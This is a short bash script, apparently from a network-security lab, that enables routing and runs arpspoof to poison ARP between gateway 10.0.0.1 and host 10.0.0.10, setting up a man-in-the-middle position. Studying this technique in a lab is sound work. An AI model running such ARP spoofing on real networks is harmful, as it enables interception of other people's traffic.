#!/bin/bash

clear

if [ "$#" -ne 0 ]
then
	echo "usage: ./prepare.sh"
else
	#tmux new-session \; split-window -v \; select-pane -t 1
	./enable_routing.sh
	../bin/arpspoof -v -g 10.0.0.1 10.0.0.10 -r 1
	#tmux select-pane -t 0
fi
